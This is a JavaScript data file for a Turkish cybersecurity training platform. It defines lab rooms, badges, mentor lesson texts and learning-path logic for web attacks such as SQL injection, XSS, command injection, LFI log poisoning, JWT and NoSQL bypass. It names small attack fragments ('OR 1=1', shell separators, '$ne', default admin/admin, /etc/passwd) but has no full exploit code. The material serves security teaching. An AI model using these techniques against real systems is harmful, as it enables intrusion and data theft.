/* ===========================================================================
   siberkampus — Room & Category Data + Category Page
   Shared data source for rooms, categories, badges.
   =========================================================================== */

const SK_CATEGORIES = [
  {
    slug: 'web-exploitation', name: 'Web Exploitation', icon: '🌐', color: '#00ff88',
    desc: 'SQL Injection, XSS, CSRF ve daha fazlası — web uygulamalarındaki zafiyetleri keşfet ve sömür.',
    rooms: [
      { id: 'web-01', name: 'SQL Injection: Giriş & Bypass', difficulty: 'Başlangıç', desc: 'Temel SQLi tekniklerini öğren ve ilk bayrağını yakala.', users: 1420, points: 50 },
      { id: 'web-04', name: 'Reflected XSS: Oturum Çalma', difficulty: 'Başlangıç', desc: 'Reflected XSS ile cookie çalma.', users: 1290, points: 50 },
      { id: 'web-11', name: 'Kaba Kuvvet & Varsayılan Kimlik Bilgileri', difficulty: 'Başlangıç', desc: 'Router yöneticisinin varsayılan kimlik bilgileriyle giriş yapma.', users: 1150, points: 50 },
      { id: 'web-12', name: 'Command Injection: RCE Keşfi', difficulty: 'Başlangıç', desc: 'Ping panelinden komut enjeksiyonu ile bayrak okuma.', users: 1080, points: 50 },
      { id: 'web-13', name: 'Kaynak Kod Analizi & Hassas Bilgi Sızıntısı', difficulty: 'Başlangıç', desc: 'HTML yorum satırlarında gizlenen bayrağı bulma.', users: 980, points: 50 },
      { id: 'web-14', name: 'Directory Traversal: Dosya Okuma', difficulty: 'Başlangıç', desc: '../ ile yol traversal yaparak sunucu dosyalarını okuma.', users: 890, points: 50 },
      { id: 'web-15', name: 'Cookie Tampering: Yetki Yükseltme', difficulty: 'Başlangıç', desc: 'İstemci tarafı çerezleri değiştirerek yetki yükseltme.', users: 820, points: 50 },
      { id: 'web-19', name: 'IDOR & Rol Değişimi ile Yetki Yükseltme', difficulty: 'Başlangıç', desc: 'Profil veya kullanıcı ayarları güncellenirken istek parametrelerindeki rol alanlarını değiştirerek yönetici yetkilerine yüksel.', users: 1020, points: 50 },
      { id: 'web-02', name: 'UNION-Based SQLi: Veri Tabanı Sızdırma', difficulty: 'Orta', desc: 'UNION SELECT ile çoklu tablo dump etme.', users: 950, points: 75 },
      { id: 'web-05', name: 'Stored & DOM XSS: Kalıcı Sömürü', difficulty: 'Orta', desc: 'Kalıcı XSS ve DOM manipülasyonu.', users: 870, points: 75 },
      { id: 'web-06', name: 'CSRF: Cross-Site Request Forgery', difficulty: 'Orta', desc: 'Cross-Site Request Forgery ile işlem tetikleme.', users: 780, points: 70 },
      { id: 'web-16', name: 'LFI & Log Poisoning: Log Dosyaları Üzerinden RCE', difficulty: 'Orta', desc: 'Yerel dosya dahil etme (LFI) açığını apache/nginx log poisoning yöntemiyle birleştirerek sunucuda uzaktan kod çalıştır (RCE).', users: 720, points: 80 },
      { id: 'web-17', name: 'API BOLA: Yetkisiz Nesne Erişimi', difficulty: 'Orta', desc: 'API endpoint\'lerindeki kimlik ve nesne parametrelerini (ID) manipüle ederek yetkisiz veri sızıntısı (BOLA) gerçekleştir.', users: 690, points: 75 },
      { id: 'web-03', name: 'Blind SQLi: Boolean & Time-Based', difficulty: 'İleri', desc: 'Boolean ve time-based blind injection.', users: 680, points: 100 },
      { id: 'web-07', name: 'File Upload Bypass: Web Shell', difficulty: 'İleri', desc: 'Dosya yükleme filtrelerini atlatma ve shell alma.', users: 620, points: 100 },
      { id: 'web-08', name: 'SSRF & XXE: İç Ağ Sızması', difficulty: 'İleri', desc: 'Server-Side Request Forgery ve XML Entity injection.', users: 580, points: 120 },
      { id: 'web-18', name: 'NoSQL Injection: MongoDB Bypass', difficulty: 'İleri', desc: 'NoSQL mantıksal operatör enjeksiyonu ($ne, $gt) ile veritabanı filtrelerini ve login panelini bypass et.', users: 480, points: 100 },
      { id: 'web-09', name: 'JWT Token Sömürüsü & Algoritma Bypass', difficulty: 'Uzman', desc: 'JWT zafiyetleri: none algorithm, key confusion.', users: 510, points: 150 },
    ]
  },
  {
    slug: 'network-pentest', name: 'Ağ Sızma Testi', icon: '🔗', color: '#5cffba',
    desc: 'Ağ keşfi, port tarama, servis sömürüsü ve pivotlama — kurumsal ağlara sızma.',
    rooms: [
      { id: 'net-01', name: 'Nmap ile Ağ Keşfi', difficulty: 'Başlangıç', desc: 'Port tarama, servis tespiti ve OS fingerprinting.', users: 3100, points: 50 },
    ]
  },
];

const SK_ALL_ROOMS = SK_CATEGORIES.flatMap(c => c.rooms.map(r => ({ ...r, cat: c.name, catSlug: c.slug, catIcon: c.icon })));

const SK_ALL_BADGES = [
  // Rozet tanımları — durum bilgisi getDynamicBadges() ile runtime'da hesaplanır
  { icon: '🥇', name: 'Güvenlik Uzmanı Başlangıcı', desc: 'İlk laboratuvarını çöz' },
  { icon: '🔥', name: '7 Gün Seri', desc: '7 gün üst üste giriş yap' },
  { icon: '🌐', name: 'Web Avcısı', desc: '5 web görevini tamamla' },
  { icon: '⚡', name: 'Hızlı Parmaklar', desc: 'Bir görevi tamamla' },
  { icon: '🔓', name: 'İlk Kan', desc: 'Bir bayrağı yakala' },
  { icon: '📡', name: 'Ağ Takipçisi', desc: '5 ağ görevi tamamla' },
  { icon: '⭐', name: 'Uzman Seviyesi', desc: 'Level 8\'e ulaş' },
  { icon: '🏆', name: "İlk 50'de", desc: 'Liderlik tablosunda ilk 50' },
  { icon: '🎯', name: 'CTF Mimarı', desc: '5 CTF zincirini tamamla' },
  { icon: '🌙', name: 'Gece Kuşu', desc: 'Gece 02:00\'de görev çöz' },
  { icon: '🛡️', name: 'Savunmacı', desc: 'Blue team görevlerini bitir' },
  { icon: '👑', name: 'Efsane', desc: '100.000 puana ulaş' },
  { icon: '💀', name: 'Root Master', desc: '10 sisteme root ol' },
  { icon: '🏅', name: '30 Gün Seri', desc: '30 gün üst üste giriş yap' },
  { icon: '💎', name: 'Tam Koleksiyon', desc: 'Tüm rozetleri kazan' },
];

// Export to window for cross-scope access
const MENTOR_LESSONS_INFO = {
  // web exploitation
  'web-01': {
    scenario: "Merhaba {name}. Hedef uygulamanın giriş panelinde girdilerin parametrik olmayan sorgularla doğrudan SQL motoruna gönderildiğini fark ettik. Bu giriş formunu manipüle etmeli ve admin paneline erişim sağlamalısın.",
    goals: [
      "SQL sorgularının backend mantığını anlamak",
      "Kimlik doğrulama bypass tekniklerini kavramak",
      "Giriş formlarında SQL enjeksiyon açıklarını test etmek"
    ],
    realWorld: "Gerçek sızma testlerinde bu tür bypass açıkları sistemlerin saniyeler içinde ele geçirilmesine yol açar. Geliştiricilere Parametrik Sorgular (Prepared Statements) kullanmalarını tavsiye etmelisin.",
    learned: [
      "SQL enjeksiyon zafiyetini tespit etmeyi öğrendin.",
      "Giriş formlarında SQL mantıksal sorgularını (`OR 1=1`) kullanarak bypass yapabildin."
    ]
  },
  'web-04': {
    scenario: "Merhaba {name}. Arama kutusuna yazılan girdilerin hiçbir filtrelemeden geçirilmeden sayfaya yansıtıldığını (reflected) gördük. Bir javascript kodu enjekte ederek kurbanın tarayıcısında çalıştırmalı ve oturum anahtarını (cookie) ele geçirmelisin.",
    goals: [
      "Reflected XSS zafiyetinin çalışma mantığı",
      "JavaScript enjeksiyonu ile cookie çalma",
      "Girdi temizleme ve çıktı kodlama prensipleri"
    ],
    realWorld: "Reflected XSS, kimlik avı (phishing) saldırılarıyla birleştiğinde kurbanların oturumlarını çalmak için birebirdir. Çözüm için HttpOnly cookie bayrağını ve CSP (Content Security Policy) politikalarını önermelisin.",
    learned: [
      "Reflected XSS açığı barındıran parametreleri keşfetmeyi öğrendin.",
      "Kurbanın oturum bilgilerini çalmak için JavaScript payload'ları geliştirdin."
    ]
  },
  'web-02': {
    scenario: "Merhaba {name}. Web sayfasındaki ürün listeleme parametresinin SQL enjeksiyonuna açık olduğunu gördük. SQL sorgularına `UNION SELECT` ekleyerek veritabanındaki diğer tablolardan (örneğin kullanıcılar ve şifreler) veri sızdırmalısın.",
    goals: [
      "Sorgu sütun sayısını tespit etme (`ORDER BY`)",
      "UNION SELECT ile veri birleştirme",
      "Veritabanı şeması, tablo ve kolon isimlerini dökme"
    ],
    realWorld: "UNION-based SQLi, bir saldırganın veritabanındaki tüm hassas verileri (kullanıcılar, şifreler, kredi kartları) saniyeler içinde indirmesine (dump) olanak tanır. Çözüm kesinlikle ORM kullanmak ya da parametrik sorgulara geçmektir.",
    learned: [
      "Sütun sayısını ve veri tiplerini eşleştirmeyi öğrendin.",
      "Veritabanındaki gizli tabloları dökerek admin şifrelerini sızdırdın."
    ]
  },
  'web-05': {
    scenario: "Merhaba {name}. Yorum yapma alanında gönderilen yorumların veritabanına kaydedildiğini ve sayfayı ziyaret eden herkese gösterildiğini tespit ettik. Kalıcı (stored) bir XSS payload'u yazarak admin panelini ziyaret eden adminin oturumunu ele geçirmelisin.",
    goals: [
      "Stored ve DOM tabanlı XSS arasındaki farklar",
      "Veritabanına javascript kodu enjekte etme",
      "DOM manipülasyonu ile client-side sömürü"
    ],
    realWorld: "Stored XSS, en tehlikeli XSS türüdür çünkü tek bir enjeksiyonla sayfaya giren yüzlerce kullanıcının oturumu çalınabilir veya tarayıcıları exploit kitlere yönlendirilebilir.",
    learned: [
      "Kalıcı XSS zafiyetlerini veritabanı girdileri üzerinden sömürmeyi öğrendin.",
      "DOM nesnelerini manipüle ederek istemci taraflı siber saldırı gerçekleştirdin."
    ]
  },
  'web-06': {
    scenario: "Merhaba {name}. Kullanıcı şifre değiştirme formunda CSRF koruma token'larının bulunmadığını veya doğrulanmadığını fark ettik. Kurbana sahte bir istek tetikleterek onun haberi olmadan şifresini değiştirecek bir HTML payload'u hazırlamalısın.",
    goals: [
      "CSRF (Cross-Site Request Forgery) mantığı",
      "Otomatik tetiklenen sahte form hazırlama",
      "SameSite çerez politikaları"
    ],
    realWorld: "CSRF, kullanıcıların tarayıcılarında açık olan oturumları kullanarak onların adına yetkisiz işlemler (para transferi, e-posta değiştirme vb.) yapılmasına neden olur. Çözüm olarak benzersiz Anti-CSRF Token'ları kullanılmalıdır.",
    learned: [
      "CSRF açığı barındıran hassas işlem formlarını tespit etmeyi öğrendin.",
      "Oturum açıkken arka planda istek tetikleyen sahte form senaryoları tasarladın."
    ]
  },
  'web-03': {
    scenario: "Merhaba {name}. Hedef uygulamanın girişinde SQL hataları gösterilmiyor ve veri ekrana yansımıyor. Ancak sorgunun doğru veya yanlış olmasına göre sayfa farklı yanıtlar veriyor (veya gecikiyor). Boolean ve Time-based tekniklerle karakter karakter veri sızdırmalısın.",
    goals: [
      "Kör (Blind) SQL enjeksiyon kavramı",
      "SUBSTRING, ASCII ve SLEEP fonksiyonları kullanımı",
      "Koşullu mantıkla veritabanından harf harf veri sızdırma"
    ],
    realWorld: "Blind SQLi, ekranda çıktı veya hata vermeyen sessiz sistemlerde bile tüm veritabanını dökebilmeyi sağlar. Otomatize araçlar (sqlmap gibi) arka planda binlerce boolean/time sorgusu atarak çalışır.",
    learned: [
      "Hata mesajı vermeyen sistemlerde SQLi varlığını doğrulamayı öğrendin.",
      "Zaman gecikmesi (time-based) veya mantıksal farklar (boolean-based) ile veri sızdırma algoritmasını kavradın."
    ]
  },
  'web-07': {
    scenario: "Merhaba {name}. Profil resmi yükleme alanında dosya uzantısı kontrolünün yalnızca istemci tarafında veya yetersiz yapıldığını belirledik. Filtreleri atlatarak (bypass) sisteme bir PHP Web Shell yüklemeli ve sunucuda kod çalıştırmalısın.",
    goals: [
      "Client-side filtreleri atlatma",
      "MIME-Type ve Double Extension (çift uzantı) bypass",
      "Web Shell kullanarak sunucuda uzaktan kod çalıştırma (RCE)"
    ],
    realWorld: "File Upload bypass zafiyetleri, saldırganların sunucunun tam kontrolünü ele geçirmesine (RCE) yol açar. Sunucu tarafında dosya uzantısı, içerik tipi doğrulanmalı ve yüklenen dosyalar çalıştırılamayan bir dizine atılmalıdır.",
    learned: [
      "Farklı dosya yükleme filtreleme yöntemlerini (uzantı, MIME, magic numbers) aşmayı öğrendin.",
      "Web shell yükleyerek sunucu işletim sistemi düzeyinde komut çalıştırma yetkisi kazandın."
    ]
  },
  'web-08': {
    scenario: "Merhaba {name}. Web uygulaması dışarıdan aldığı URL veya XML verilerini sunucu tarafında işliyor. SSRF ile sunucuya içerideki gizli ağ servislerini taratmalı, XXE ile XML parser'ı manipüle edip sunucu üzerindeki `/etc/passwd` dosyasını okumalısın.",
    goals: [
      "Server-Side Request Forgery (SSRF) ile iç ağ keşfi",
      "XML External Entity (XXE) zafiyeti ile dosya okuma",
      "Dış entity tanımları ile veri sızdırma"
    ],
    realWorld: "SSRF ve XXE, bulut altyapılarında (AWS, GCP metadata servisleri vb.) internal anahtarları ele geçirmek ve iç ağdaki korumalı sistemlere sızmak için son derece kritik açıklardır.",
    learned: [
      "Sunucu üzerinden iç ağa yönelik istekler göndermeyi öğrendin.",
      "Güvensiz XML kütüphanelerinin yerel dosyaları sızdırmak için nasıl sömürüldüğünü anladın."
    ]
  },
  'web-09': {
    scenario: "Merhaba {name}. Uygulamanın kullandığı JSON Web Token (JWT) mekanizmasında imza doğrulamasının `none` algoritmasıyla bypass edilebildiğini veya zayıf bir anahtar kullanıldığını gördük. Token'ı manipüle ederek admin rolünü almalı ve içeri sızmalısın.",
    goals: [
      "JWT yapısı (Header, Payload, Signature)",
      "Algoritma karıştırma ve `none` algoritması açığı",
      "Token manipülasyonu ve yetki yükseltme"
    ],
    realWorld: "JWT zafiyetleri, API tabanlı modern uygulamalarda en çok karşılaşılan yetkilendirme hatalarındandır. Güçlü imza algoritmaları (RS256) seçilmeli ve sunucu tarafında imza asla boş geçilmemelidir.",
    learned: [
      "JWT yapısını decode edip içindeki parametreleri manipüle etmeyi öğrendin.",
      "`none` algoritması kullanarak imza doğrulamasını tamamen devre dışı bırakmayı başardın."
    ]
  },
  'web-11': {
    scenario: "Merhaba {name}. Şirketteki ağ router'ının yönetim paneline erişmemiz gerekiyor. Cihazın varsayılan fabrika ayarları hiç değiştirilmemiş. Varsayılan kimlik bilgilerini (admin/admin) kullanarak kontrol paneline giriş yap ve router bayrağını oku.",
    goals: [
      "Varsayılan kimlik bilgilerin risklerini anlamak",
      "Ortak varsayılan parolaları bilmek (admin/admin, root/root vb.)",
      "Ağ cihazlarının yönetim panellerine erişim sağlamak"
    ],
    realWorld: "Güvenlik incelemelerde kurumsal ağ cihazlarının (switch, router, firewall) hiç güncellenmemiş ve varsayılan parolaları kullanıyor olduğu sıkça görülür. Bu durumda tüm ağ altyapısı ele geçirilebilir. Varsayılan parolaları değiştirmek temel güvenlik uygulamalarından biridir.",
    learned: [
      "Varsayılan kimlik bilgileriyle ağ cihazlarına erişmeyi öğrendin.",
      "Router yönetim panelinde ayrıcalıklı bilgilere ulaştın."
    ]
  },

  'web-12': {
    scenario: "Merhaba {name}. Şirketteki ağ yöneticileri bir ping atma utility'si geliştirmişler. Kullanıcı girdisini hiçbir doğrulama yapılmadan doğrudan shell komutuna aktarıyorlar. Komut ayırıcı karakterler kullanarak ek komutlar enjekte et ve flag.txt dosyasını oku.",
    goals: [
      "Komut enjeksiyonu zafiyetinin çalışma mekanizması",
      "Shell komut ayırıcılarını kullanma (;, |, &&, ||)",
      "Arka planda istemci olmadan komut çalıştırma"
    ],
    realWorld: "Komut enjeksiyonu zafiyetleri, saldırganın sunucu üzerinde doğrudan işletim sistemi komutları çalıştırmasına (RCE) olanak tanır. Bu tür açıklar en tehlikeli olanlarındandır. Tüm kullanıcı girdileri düzenlenmelidir (whitelist/blacklist) veya sistem komutları hiç çağrılmamalıdır.",
    learned: [
      "Shell komut ayırıcılarıyla komut enjeksiyonu gerçekleştirmeyi öğrendin.",
      "Bir sistem komutunun yan etkisini kullanarak rastgele kod çalıştırmayı başardın."
    ]
  },

  'web-13': {
    scenario: "Merhaba {name}. Web sitesinin HTML kaynak kodlarında geliştiriciler tarafından gizlenen yorum satırları var. Tarayıcının geliştirici araçlarını (DevTools) açıp sayfa kaynağını inceleyerek, HTML yorumların içinden bayrak kısıtını oku.",
    goals: [
      "Tarayıcı geliştirici araçlarını kullanmak",
      "HTML kaynak kodunu incelemek",
      "Gizli yazıları ve açıklamaları yorumlarda bulma"
    ],
    realWorld: "Geliştiriciler test sırasında kod içerisine geçici notlar, API anahtarları, veya test bayraklarıyla birlikte yorum satırları bırakabilirler. Proje yayına çıkmadan önce bu tür hassas bilgilerin dikkatli şekilde temizlenmesi şarttır. Kaynak kod analizi, sızma testlerinin ilk adımlarından biridir.",
    learned: [
      "Tarayıcı DevTools ile sayfa kaynağını analiz etmeyi öğrendin.",
      "HTML yorum satırlarında gizlenen hassas bilgileri bulmayı başardın."
    ]
  },

  'web-14': {
    scenario: "Merhaba {name}. Dosya indirme modülünde bir dizin geçişi (directory traversal) zafiyeti var. Kullanıcıdan alınan dosya adı parametresi hiçbir doğrulama yapılmadan dosya sistemi yoluna katılıyor. Üst dizinlere tırmanarak sunucu kök dizininde bulunan flag.txt dosyasını oku.",
    goals: [
      "Dizin geçişi (path traversal) mekanizması",
      "Göreli yol (./) ve üst dizin (..) notasyonunun kullanımı",
      "Dosya sistemi yapısını keşfetme"
    ],
    realWorld: "Dizin geçişi zafiyetleri, saldırganın sunucu dosya sisteminderesim, yapılandırma, veya şifre dosyaları gibi hassas dosyalara erişmesini sağlar. Belirtilen dizin dışına çıkılmasını engellemeyen güvensiz yapılandırmalara örnek olarak index dosyaları da verilebilebilir.",
    learned: [
      "Dosya indirme parametreleri aracılığıyla dizin yapısını traverse etmeyi öğrendin.",
      "Sunucu kök dizinine erişerek korumalı dosyaları okumayı başardın."
    ]
  },

  'web-15': {
    scenario: "Merhaba {name}. E-ticaret sitesinin giriş sayfası, kullanıcının rolünü (guest/admin) şifrelenmemiş bir çerezde saklamaktadır. Tarayıcı DevTools'u açıp çerez değerini admin olarak değiştir ve yönetim paneline erişim sağla.",
    goals: [
      "Çerez yönetimi ve istemci tarafı depolama mekanizmaları",
      "Şifrelenmemiş çerezlerin riskleri",
      "Yetkilendirme bypass tekniklerini anlamak"
    ],
    realWorld: "Yetkilendirme verileri hiçbir şekilde istemci tarafında saklanmamalıdır. Sunucu tarafında tutulan oturum bilgileri, şifreleme, ve dijital imza olmadan istemci verilerine hiç güvenilmemelidir. Çerez manipülasyonu, çoğu web sitesinde yetkisiz erişimin en kolay yollarından biridir.",
    learned: [
      "DevTools aracılığıyla çerez bilgilerini incelemek ve düzenlemeyi öğrendin.",
      "Çerez manipülasyonuyla yetki yükseltme (privilege escalation) başardın."
    ]
  },

  // network pentest
  'net-01': {
    scenario: "Merhaba {name}. Sızma testinin ilk adımı keşiftir. Nmap aracını kullanarak hedef sistemin açık portlarını, çalışan servislerini ve işletim sistemini tespit etmelisin.",
    goals: [
      "Port tarama ve servis sürümü tespiti (`-sV`)",
      "İşletim sistemi tespiti (`-O`) ve hızlı tarama (`-F`)",
      "Nmap Scripting Engine (NSE) kullanımı"
    ],
    realWorld: "Pentest projelerinde ağ keşfi yapılmadan hiçbir saldırı planlanamaz. Açık servislerin ve versiyonların tespiti, doğrudan bilinen exploit'leri aramaya yönlendirir.",
    learned: [
      "Açık portları ve servis versiyonlarını doğru analiz etmeyi öğrendin.",
      "İşletim sistemi analizi ve agresif tarama yöntemlerini kavradın."
    ]
  },

  'web-16': {
    scenario: "Merhaba {name}. Hedef sunucu üzerindeki bir parametrenin LFI (Local File Inclusion) zafiyetine sahip olduğunu tespit ettik. LFI tek başına sadece dosya okumaya yarar; ancak sunucudaki apache/nginx access log dosyalarına web shell payload'u gönderip ardından bu log dosyasını LFI ile dahil ederek RCE (Uzaktan Kod Çalıştırma) elde etmelisin.",
    goals: [
      "LFI açığını tespit etme ve dizin geçişi ile birleştirme",
      "Log Poisoning (Log Zehirleme) yöntemini anlama",
      "User-Agent veya diğer HTTP başlıkları üzerinden kod enjeksiyonu",
      "Log dosyalarını dahil ederek sistemde komut çalıştırma"
    ],
    realWorld: "Log zehirleme, bir dosya okuma/dahil etme açığını tam komut çalıştırma yetkisine dönüştüren son derece kritik bir post-exploitation tekniğidir. Savunma için girdi kontrolü ve log dosyası erişim izinlerinin sıkılaştırılması önerilir.",
    learned: [
      "LFI zafiyetini log zehirleme (log poisoning) ile birleştirerek RCE elde etmeyi öğrendin.",
      "HTTP istek başlıklarının sunucu loglarında nasıl işlendiğini ve sömürüldüğünü kavradın."
    ]
  },

  'web-17': {
    scenario: "Merhaba {name}. REST API tabanlı modern web uygulamalarında BOLA (Broken Object Level Authorization) en sık karşılaşılan kritik açıklardan biridir. `/api/v1/users/{id}/profile` endpoint'inde, diğer kullanıcılara ait nesne ID'lerini (örneğin sıralı veya UUID formatındaki id parametrelerini) manipüle ederek yetkisiz şekilde veri sızdırmalısın.",
    goals: [
      "API istek yapısını ve parametrelerini analiz etme",
      "Nesne düzeyinde yetki doğrulama eksikliğini tespit etme",
      "ID parametrelerini değiştirerek (ID değiştirme saldırısı) yetkisiz veri sızdırma"
    ],
    realWorld: "BOLA zafiyetleri, saldırganların milyonlarca kullanıcının kişisel verilerini, faturalarını veya özel dosyalarını sadece ID numaralarını artırarak indirmelerine sebep olur. Çözüm olarak sunucu tarafında her istek için nesne sahipliği doğrulaması yapılmalıdır.",
    learned: [
      "BOLA / IDOR zafiyetlerini API endpoint'lerinde aramayı ve sömürmeyi öğrendin.",
      "İstemciye güvenen zayıf yetkilendirme modellerinin risklerini kavradın."
    ]
  },

  'web-18': {
    scenario: "Merhaba {name}. Klasik ilişkisel veritabanlarının aksine NoSQL veritabanları (MongoDB vb.) SQL kullanmaz; fakat zayıf girdi temizliği durumunda mantıksal sorgu operatörleri ($ne, $gt, $regex) enjekte edilebilir. Giriş panelinde şifre alanına bir nesne enjekte ederek kimlik doğrulamayı bypass etmelisin.",
    goals: [
      "NoSQL sorgu yapısını ve JSON girdi manipülasyonunu anlama",
      "MongoDB mantıksal operatörlerini (`$ne` - not equal vb.) kullanma",
      "Admin girişini şifre bilmeden bypass etme"
    ],
    realWorld: "NoSQL Injection, SQL Map gibi geleneksel tarayıcılar tarafından kolayca tespit edilemeyebilir ancak aynı derecede tehlikelidir ve tüm veritabanı şemasını dökmeye veya yetkisiz girişe yol açabilir. Çözüm, girdilerin şema düzeyinde doğrulanmasıdır.",
    learned: [
      "NoSQL veritabanlarında sorgu enjeksiyonu yapmayı öğrendin.",
      "`$ne` operatörü kullanarak kullanıcı doğrulamalarını atlatmayı başardın."
    ]
  },

  'web-19': {
    scenario: "Merhaba {name}. Kullanıcı hesabı ayarlarını güncellerken HTTP POST istek gövdesinde (JSON) gizli parametrelerin (örneğin `role: 'user'` veya `is_admin: false`) gönderildiğini gördük. Bu isteği yakalayıp rol değerini `admin` olarak manipüle etmeli ve sunucuda dikey yetki yükseltme gerçekleştirmelisin.",
    goals: [
      "Kullanıcı profil güncelleme isteklerini yakalama",
      "Gizli parametreleri (Mass Assignment / Parameter Pollution) keşfetme",
      "Rol manipülasyonu ile dikey yetki yükseltme (Privilege Escalation)"
    ],
    realWorld: "İstemciden gelen rol bilgilerinin sunucu tarafında roller hiyerarşisiyle denetlenmeden doğrudan veritabanına yazılması (Mass Assignment), bir kullanıcının saniyeler içinde admin yetkisi kazanmasına neden olur.",
    learned: [
      "Parametre manipülasyonu ile dikey yetki yükseltme yapmayı öğrendin.",
      "Sunucu tarafında korumasız bırakılan veri modeli güncelleme açıklarını tespit ettin."
    ]
  }
};

// ======== LEARNING PATHWAYS (İlerleme Haritası) ========

const SK_PATHWAYS = [
  {
    slug: 'web-pentest',
    name: 'Web Pentest Uzmanı Yolu',
    icon: '🌐',
    color: '#00ff88',
    desc: 'Sıfırdan web sızma testi uzmanına — teori, pratik ve gerçek hedef sitelerde pentest.',
    phases: [
      {
        id: 'phase-1',
        name: 'Teori & Ortam Kurulumu',
        desc: 'Araçlarını kur, temel kavramları öğren.',
        icon: '📚',
        order: 1,
        type: 'theory',
        items: [
          { type: 'doc', id: 'doc-kali-setup', name: 'Kali Linux & Burp Suite Kurulumu', readTime: '15 dk', required: true },
          { type: 'doc', id: 'doc-http-basics', name: 'HTTP Protokolü & Web Mimarisi', readTime: '12 dk', required: true },
          { type: 'doc', id: 'doc-devtools', name: 'Tarayıcı DevTools Kullanımı', readTime: '8 dk', required: true },
        ]
      },
      {
        id: 'phase-2',
        name: 'Temel Zafiyetler',
        desc: 'Başlangıç seviyesi web zafiyetlerini keşfet ve sömür.',
        icon: '🔓',
        order: 2,
        type: 'practice',
        requires: ['phase-1'],
        items: [
          { type: 'room', id: 'web-13' },
          { type: 'room', id: 'web-11' },
          { type: 'room', id: 'web-15' },
          { type: 'room', id: 'web-19' },
          { type: 'room', id: 'web-01' },
          { type: 'room', id: 'web-04' },
          { type: 'room', id: 'web-14' },
          { type: 'room', id: 'web-12' },
        ]
      },
      {
        id: 'phase-3',
        name: 'Orta Seviye Saldırılar',
        desc: 'Daha karmaşık zafiyet zincirleri ve istek manipülasyonu.',
        icon: '⚡',
        order: 3,
        type: 'practice',
        requires: ['phase-2'],
        items: [
          { type: 'doc', id: 'doc-burp-proxy', name: 'Burp Suite Proxy ile İstek Manipülasyonu', readTime: '10 dk', required: true },
          { type: 'room', id: 'web-02' },
          { type: 'room', id: 'web-05' },
          { type: 'room', id: 'web-06' },
          { type: 'room', id: 'web-16' },
          { type: 'room', id: 'web-17' },
        ]
      },
      {
        id: 'phase-4',
        name: 'İleri Seviye Saldırılar',
        desc: 'Shell alma, dosya yükleme bypass, SSRF ve JWT sömürüsü.',
        icon: '🔥',
        order: 4,
        type: 'practice',
        requires: ['phase-3'],
        items: [
          { type: 'doc', id: 'doc-shells', name: 'Web Shell & Reverse Shell Temelleri', readTime: '10 dk', required: true },
          { type: 'room', id: 'web-03' },
          { type: 'room', id: 'web-07' },
          { type: 'room', id: 'web-08' },
          { type: 'room', id: 'web-18' },
          { type: 'room', id: 'web-09' },
        ]
      },
      {
        id: 'phase-5',
        name: 'Gerçek Pentest Operasyonu',
        desc: 'Canlı hedef sitelerde tam sızma testi gerçekleştir.',
        icon: '💀',
        order: 5,
        type: 'pentest',
        requires: ['phase-4'],
        premium: true,
        items: [
          { type: 'doc', id: 'doc-pentest-methodology', name: 'Pentest Metodolojisi & Raporlama', readTime: '15 dk', required: true },
          { type: 'doc', id: 'doc-recon-tools', name: 'Keşif Araçları: Nmap, Dirb, Gobuster', readTime: '12 dk', required: true },
          { type: 'target', id: 'target-01', name: 'Hedef Site 1: Teksas Üniversitesi OBS', targetUrl: 'https://target-1-ng42bphos-kinyas-projects.vercel.app', flagCount: 5 },
          { type: 'target', id: 'target-02', name: 'Hedef Site 2: Bazaario E-Ticaret Platformu', targetUrl: 'https://target-2-9wegc53mz-kinyas-projects.vercel.app', flagCount: 4 },
          { type: 'target', id: 'target-03', name: 'Hedef Site 3: Washington Bank Kurumsal Şubesi', targetUrl: 'https://target-3-cw9jbn9uk-kinyas-projects.vercel.app', flagCount: 4 },
          { type: 'target', id: 'target-04', name: 'Hedef Site 4: Vera Chat İletişim Portalı', targetUrl: 'https://target-4-2520wlvyg-kinyas-projects.vercel.app', flagCount: 6 },
        ]
      }
    ]
  }
];

// Resolve room details from SK_CATEGORIES into pathway items
const SK_ROOMS_MAP = {};
SK_ALL_ROOMS.forEach(r => { SK_ROOMS_MAP[r.id] = r; });

function getPathwayItemDetails(item) {
  if (item.type === 'room') {
    const r = SK_ROOMS_MAP[item.id];
    return r ? { ...item, name: r.name, difficulty: r.difficulty, points: r.points, users: r.users, desc: r.desc } : item;
  }
  return item;
}

function isPhaseComplete(pathway, phaseId, solvedRooms, completedDocs) {
  const phase = pathway.phases.find(p => p.id === phaseId);
  if (!phase) return false;
  return phase.items.every(item => {
    if (item.type === 'room') return solvedRooms.includes(item.id);
    if (item.type === 'doc' && item.required) return completedDocs.includes(item.id);
    if (item.type === 'target') return solvedRooms.includes(item.id);
    return true;
  });
}

function isPhaseUnlocked(pathway, phaseId, solvedRooms, completedDocs) {
  const phase = pathway.phases.find(p => p.id === phaseId);
  if (!phase || !phase.requires) return true;
  return phase.requires.every(reqId => isPhaseComplete(pathway, reqId, solvedRooms, completedDocs));
}

function isItemUnlocked(pathway, phaseId, itemIndex, solvedRooms, completedDocs) {
  if (!isPhaseUnlocked(pathway, phaseId, solvedRooms, completedDocs)) return false;
  const phase = pathway.phases.find(p => p.id === phaseId);
  if (!phase || itemIndex <= 0) return true;
  const prev = phase.items[itemIndex - 1];
  if (prev.type === 'room') return solvedRooms.includes(prev.id);
  if (prev.type === 'doc') return completedDocs.includes(prev.id);
  if (prev.type === 'target') return solvedRooms.includes(prev.id);
  return true;
}

Object.assign(window, {
  SK_CATEGORIES, SK_ALL_ROOMS, SK_ALL_BADGES, MENTOR_LESSONS_INFO,
  SK_PATHWAYS, SK_ROOMS_MAP, getPathwayItemDetails, isPhaseComplete, isPhaseUnlocked, isItemUnlocked
});



/* ============ LESSONS & QUIZ DATA ============ */
window.SK_LESSONS = {
  "ag-guvenligi": [
    {
      "id": "ag-01",
      "title": "TCP/IP Model ve Katmanları",
